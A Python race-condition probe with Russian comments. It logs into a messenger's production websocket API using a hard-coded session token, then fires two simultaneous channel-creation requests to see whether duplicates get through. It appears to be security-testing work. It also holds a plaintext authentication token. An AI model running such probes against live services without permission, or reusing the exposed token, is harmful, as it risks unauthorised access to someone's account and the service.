#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import asyncio
import json
import time
import websockets

# ============================================
# НАСТРОЙКИ (ВСТАВЛЕНЫ ТВОИ ДАННЫЕ)
# ============================================
WS_URL = "wss://ws-api.oneme.ru/websocket"
TOKEN = "An_Sx6HQ9HDiAhYbeeTQIzeyWg4Nb7-2I3R3eEEaYrUQtogNfVgCm7tG2roDhre3sXwdmxa4UfV7CBGbtcZIKEkSuIVnCliF2Y0nUchAAzE6tdULAsbBmgnByg_ETwZtMQLQTgIpbuq_Mu8EEfa1lcH6zU6Z-B6MiRJ5VGpvXK0C2HKDMm1qZ2XyKSgwKCO_rM5Admk174BqntbqXPP93wyE-Rg6_O2gKDn7dGAQa2lsntaF-bIpkwCjIcIN46UKz7BEdXIgXO_aSTWFb7YxNVJMxxSroXD0efgiSe94shQvioh8S0M917wzqk2c7OrgDUsVPDXjwv1RU0Vuq3f9_hN_a_4q40h2ytLByTsa778yMezfuYT6JFcql40GHvd_JWNA6GBm7w4cFdCe2_SIKW2fLLPIlhGKsSDJpa5pvxH6b9AadxCDCeSFmfRcqW7c-zMule8hp2gekC8NTBGE2rpzBDNItQOne8mvMmb8yCW4omIPYVMvRIBIrA8OkbEXuPvbC_yabpzuRhtY1MgfUdpuW8H1fRskRGMtf-tTaQtboNwAB3A6DRo-z612eck6Cj0fz2PgykDObiYzamw2PpxF104sQzEFf10_l_KoLf4wy6F2EPoRisy6fNrHY1BSvtGu9EAlEc8UrsG0BcV6F6kdRhCI_sHKtkFfmK6tzmhns8wXYnm07nPadjKi_SSoqqTvog4"
DEVICE_ID = "3c1550ae-434a-48f1-9360-e3ceace21773"

APP_VERSION = "26.19.2"
BUILD_NUMBER = 6733

OP = {
    "PING": 1,
    "SESSION_INIT": 6,
    "LOGIN": 19,
    "CHATS_LIST": 53,
    "MSG_SEND": 64,
    "CHAT_MEMBERS_UPDATE": 77,
    "NOTIF_MESSAGE": 128,
    "NOTIF_CHAT": 135,
}
OP_NAMES = {v: k for k, v in OP.items()}

def opcode_name(code):
    return OP_NAMES.get(code, f"UNKNOWN_{code}")

seq_counter = 0
cid_counter = 0

def next_seq():
    global seq_counter
    seq_counter += 1
    return seq_counter

def next_cid():
    global cid_counter
    cid_counter = (cid_counter % 0x7FFFFFFF) + 1
    return cid_counter

def make_packet(opcode, payload, cmd=0):
    return {"ver": 11, "cmd": cmd, "seq": next_seq(), "opcode": opcode, "payload": payload}

async def send_packet(ws, opcode, payload, cmd=0):
    packet = make_packet(opcode, payload, cmd)
    await ws.send(json.dumps(packet))
    print(f"[->] {opcode_name(opcode)}({opcode}) seq={packet['seq']}")
    return packet["seq"]

def channel_payload(title):
    return {
        "message": {
            "text": "",
            "cid": next_cid(),
            "elements": [],
            "attaches": [{
                "_type": "CONTROL",
                "event": "new",
                "title": title,
                "chatType": "CHANNEL"
            }]
        },
        "notify": True
    }

def user_agent_payload():
    return {
        "deviceType": "WEB", "locale": "ru", "deviceLocale": "ru",
        "osVersion": "Windows 11", "deviceName": "Chrome",
        "headerUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "appVersion": APP_VERSION, "screen": "1920x1080 1.0x",
        "timezone": "Europe/Moscow", "clientSessionId": 1, "buildNumber": BUILD_NUMBER
    }

async def read_until(ws, predicate, timeout=10.0):
    frames = []
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            raw = await asyncio.wait_for(ws.recv(), timeout=deadline - time.monotonic())
        except asyncio.TimeoutError:
            break
        except websockets.exceptions.ConnectionClosed as e:
            print(f"[-] Соединение закрыто: {e}")
            break
        try:
            frame = json.loads(raw)
        except:
            continue
        frames.append(frame)
        op = frame.get("opcode")
        cmd = frame.get("cmd")
        print(f"[<-] {opcode_name(op)}({op}) cmd={cmd} seq={frame.get('seq')}")
        if op == OP["PING"] and cmd != 0:
            await send_packet(ws, OP["PING"], {})
        if predicate(frame):
            return frames
    return frames

async def main():
    async with websockets.connect(
        WS_URL,
        origin="https://web.max.ru",
        additional_headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    ) as ws:
        print("[*] Подключение установлено.")

        # INIT
        await send_packet(ws, OP["SESSION_INIT"], {"deviceId": DEVICE_ID, "userAgent": user_agent_payload()})
        await read_until(ws, lambda f: f.get("cmd") in (1, 3) and f.get("opcode") == OP["SESSION_INIT"])

        # LOGIN
        await send_packet(ws, OP["LOGIN"], {"token": TOKEN})
        login_frames = await read_until(ws, lambda f: f.get("opcode") == OP["LOGIN"] and f.get("cmd") in (1, 3))
        if any(f.get("cmd") == 3 for f in login_frames):
            print("[!] LOGIN отклонён.")
            return
        print("[+] Авторизован.")

        # RACE
        stamp = int(time.time()) % 100000
        title_1 = f"RaceTest_{stamp}_A"
        title_2 = f"RaceTest_{stamp}_B"
        print(f"[*] Создаем каналы: '{title_1}' и '{title_2}'")

        seq1 = await send_packet(ws, OP["MSG_SEND"], channel_payload(title_1))
        seq2 = await send_packet(ws, OP["MSG_SEND"], channel_payload(title_2))
        
        print(f"[*] Оба запроса ушли (seq={seq1}, {seq2}). Ждем ответы...")
        await read_until(ws, lambda f: False, timeout=8.0)

        print("\n=== РЕЗУЛЬТАТ ===")
        print("Если выше были ошибки (cmd=3) — защита работает.")
        print("Если создано два канала — Race Condition подтвержден!")

if __name__ == "__main__":
    asyncio.run(main())